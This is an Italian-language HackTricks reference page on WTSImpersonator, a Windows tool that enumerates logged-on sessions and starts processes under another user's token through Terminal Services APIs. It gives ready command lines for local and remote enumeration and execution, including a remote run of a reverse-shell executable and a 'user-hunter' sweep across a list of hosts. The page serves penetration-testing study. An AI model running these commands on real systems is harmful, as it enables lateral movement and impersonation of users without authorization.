# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, di Omri Baso, utilizza le API di Windows Terminal Services esposte tramite la named pipe RPC `\\pipe\LSM_API_service` per enumerare le sessioni con utenti autenticati e avviare un processo con il token dell'utente selezionato. Supporta l'enumerazione e l'esecuzione locali, nonché workflow remoti basati su servizi.<sup>[[1]](#references)</sup>

## Funzionalità principali

Il flusso di esecuzione locale utilizza la seguente sequenza di API:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Moduli e utilizzo

- **Enumerare gli utenti:** lo strumento può enumerare le sessioni sull'host locale o su un host remoto.

- In locale:
```bash
.\WTSImpersonator.exe -m enum
```
- In remoto, specificare un indirizzo IP o un hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Eseguire comandi:** i moduli `exec` e `exec-remote` richiedono un contesto di servizio. Microsoft documenta che `WTSQueryUserToken` richiede che il chiamante venga eseguito come `LocalSystem` con il privilegio `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Esecuzione di comandi locali:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec può avviare un prompt dei comandi `LocalSystem` per i test:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Esecuzione di comandi remoti:** la modalità remota crea un servizio sul target seguendo un workflow simile a PsExec e richiede quindi i diritti per installare e avviare tale servizio.<sup>[[1]](#references)</sup>

- Esempio:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Ricerca degli utenti:** il modulo `user-hunter` cerca nell'elenco degli host la sessione di un utente specificato e tenta di eseguire il programma fornito in tale contesto.<sup>[[1]](#references)</sup>
- Esempio di utilizzo:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: funzione `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
